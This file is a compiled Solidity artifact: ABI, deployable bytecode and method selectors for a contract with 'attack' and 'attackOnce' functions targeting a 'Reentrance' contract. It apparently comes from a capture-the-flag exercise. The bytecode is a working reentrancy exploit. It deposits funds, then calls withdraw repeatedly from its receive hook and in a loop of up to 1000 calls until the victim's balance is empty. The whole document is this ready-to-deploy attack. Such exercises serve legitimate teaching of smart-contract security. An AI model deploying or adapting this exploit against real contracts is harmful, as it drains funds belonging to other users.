{"abi":[{"type":"constructor","inputs":[{"name":"_victimAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackOnce","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"victim","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Reentrance"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161050c38038061050c833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b610486806100865f395ff3fe608060405260043610610036575f3560e01c8063930c20031461016e5780639e5faafc146101a8578063d600426a146101b0575f5ffd5b3661016a575f80546040516370a0823160e01b81523060048201526001600160a01b03909116906370a0823190602401602060405180830381865afa158015610081573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100a59190610439565b1115610168575f546040516370a0823160e01b81523060048201526001600160a01b0390911690632e1a7d4d9082906370a0823190602401602060405180830381865afa1580156100f8573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061011c9190610439565b6040518263ffffffff1660e01b815260040161013a91815260200190565b5f604051808303815f87803b158015610151575f5ffd5b505af1158015610163573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b348015610179575f5ffd5b505f5461018c906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6101686101c4565b3480156101bb575f5ffd5b5061016861037b565b5f546040517e362a950000000000000000000000000000000000000000000000000000000081523060048201526001600160a01b039091169062362a959034906024015f604051808303818588803b15801561021e575f5ffd5b505af1158015610230573d5f5f3e3d5ffd5b505f93505050505b6103e8811015610378575f546040516370a0823160e01b81523060048201526001600160a01b03909116906370a0823190602401602060405180830381865afa158015610287573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102ab9190610439565b15610378575f546040516370a0823160e01b81523060048201526001600160a01b0390911690632e1a7d4d9082906370a0823190602401602060405180830381865afa1580156102fd573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103219190610439565b6040518263ffffffff1660e01b815260040161033f91815260200190565b5f604051808303815f87803b158015610356575f5ffd5b505af1158015610368573d5f5f3e3d5ffd5b5050600190920191506102389050565b50565b5f546040516370a0823160e01b81523060048201526001600160a01b0390911690632e1a7d4d9082906370a0823190602401602060405180830381865afa1580156103c8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103ec9190610439565b6040518263ffffffff1660e01b815260040161040a91815260200190565b5f604051808303815f87803b158015610421575f5ffd5b505af1158015610433573d5f5f3e3d5ffd5b50505050565b5f60208284031215610449575f5ffd5b505191905056fea2646970667358221220d5aeb9d21f281652ad27b15f0295a25a5c7add13925fe2d18c4fc1b1266de0d764736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","attackOnce()":"d600426a","victim()":"930c2003"},"id":0}